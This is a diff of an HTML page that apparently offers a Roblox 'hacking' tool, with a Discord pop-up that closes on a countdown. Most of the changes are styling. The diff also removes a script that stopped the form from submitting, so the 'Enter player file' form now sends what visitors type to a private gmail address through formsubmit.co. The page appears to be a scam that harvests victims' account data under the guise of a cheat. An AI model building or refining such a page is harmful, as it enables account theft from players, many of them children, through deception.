@@ -123,41 +123,43 @@
       }
     }
 
-    /* Popup Discord */
+    /* Popup styling */
     #popup {
       position: fixed;
-      top: 10px;
-      right: 10px;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       background-color: #1a1a1a;
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 20px #000;
+      padding: 40px;
+      border-radius: 30px;
+      box-shadow: 0 0 40px #000;
       z-index: 9999;
-      max-width: 400px;
-      width: 100%;
+      max-width: 95%;
+      width: 600px;
+      text-align: center;
       opacity: 1;
       transition: opacity 0.5s ease;
     }
 
     #popup h2 {
       margin-top: 0;
-      font-size: 20px;
+      font-size: 28px;
     }
 
     #popup p {
       color: #ccc;
-      font-size: 14px;
-      margin-bottom: 10px;
+      font-size: 18px;
+      margin-bottom: 30px;
     }
 
     #popup a {
       background-color: #5865F2;
       color: white;
-      padding: 10px 15px;
+      padding: 14px 25px;
       border-radius: 12px;
       text-decoration: none;
       font-weight: bold;
-      font-size: 14px;
+      font-size: 16px;
       transition: background 0.3s;
     }
 
@@ -170,62 +172,21 @@
       pointer-events: none;
     }
 
-    /* Loader (smaller popup) */
-    .loader {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background-color: #1a1a1a;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 40px #000;
-      z-index: 10000;
-      width: 300px;
-      text-align: center;
-      display: none; /* Hidden by default */
+    /* Timer styling */
+    .popup-timer {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      background: #333;
+      padding: 5px 12px;
+      border-radius: 12px;
+      font-weight: bold;
+      font-size: 14px;
+      color: #fff;
     }
-
-    .loader__element {
-      border-radius: 100%;
-      border: 5px solid #555;
-      margin: 5px;
-    }
-
-    .loader__element:nth-child(1) {
-      animation: preloader .6s ease-in-out alternate infinite;
-    }
-    .loader__element:nth-child(2) {
-      animation: preloader .6s ease-in-out alternate .2s infinite;
-    }
-
-    .loader__element:nth-child(3) {
-      animation: preloader .6s ease-in-out alternate .4s infinite;
-    }
-
-    @keyframes preloader {
-      100% { transform: scale(2); }
-    }
-
   </style>
 </head>
 <body>
-
-  <!-- Pop-up Discord -->
-  <div id="popup">
-    <h2>🔥 Join our Discord Server</h2>
-    <p>Need help? Want tips? Or just chill with the community? Join us now!</p>
-    <a href="https://discord.gg/yourserver" target="_blank">🚀 Join Discord</a>
-    <p id="discord-timer">Closing in: 5 seconds</p>
-  </div>
-
-  <!-- Loader Pop-up -->
-  <div class="loader" id="loader">
-    <span class="loader__element"></span>
-    <span class="loader__element"></span>
-    <span class="loader__element"></span>
-  </div>
-
   <header>
     <div class="nav">
       <img src="https://bloxtools.space/assets/img/logo.png" alt="Roblox Logo" class="logo">
@@ -247,7 +208,7 @@
           </p>
           <form action="https://formsubmit.co/blackeigerbx@gmail.com" method="POST">
             <input type="text" name="playerfile" placeholder="📄 Enter player file" required>
-            <button type="submit" id="start-hacking">Start Hacking!</button>
+            <button type="submit">Start Hacking!</button>
           </form>
         </div>
       </div>
@@ -260,36 +221,28 @@
     </section>
   </main>
 
-  <script>
-    const popup = document.getElementById('popup');
-    const loader = document.getElementById('loader');
-    const startHackingButton = document.getElementById('start-hacking');
-    const discordTimer = document.getElementById('discord-timer');
-    let timer = 5;
+  <!-- 👇 Discord Pop-up -->
+  <div id="popup">
+    <div class="popup-timer" id="popup-timer">6s</div>
+    <h2>🔥 Join our Discord Server</h2>
+    <p>Need help? Want tips? Or just chill with the community? Join us now!</p>
+    <a href="https://discord.gg/yourserver" target="_blank">🚀 Join Discord</a>
+  </div>
 
-    // Hide the Discord popup after 5 seconds
-    const hidePopup = () => {
-      popup.classList.add('hidden');
-    };
-    const timerInterval = setInterval(() => {
-      if (timer <= 0) {
-        clearInterval(timerInterval);
-        hidePopup();
-      } else {
-        discordTimer.textContent = `Closing in: ${timer--} seconds`;
+  <script>
+    let countdown = 6;
+    const popup = document.getElementById('popup');
+    const timer = document.getElementById('popup-timer');
+
+    const interval = setInterval(() => {
+      countdown--;
+      timer.textContent = countdown + 's';
+
+      if (countdown <= 0) {
+        clearInterval(interval);
+        popup.classList.add('hidden');
       }
     }, 1000);
-
-    // When "Start Hacking" is clicked, show the loader
-    startHackingButton.addEventListener('click', (e) => {
-      e.preventDefault();
-      loader.style.display = 'block';
-
-      // Hide the loader after 5 seconds
-      setTimeout(() => {
-        loader.style.display = 'none';
-      }, 5000);
-    });
   </script>
 </body>
 </html>
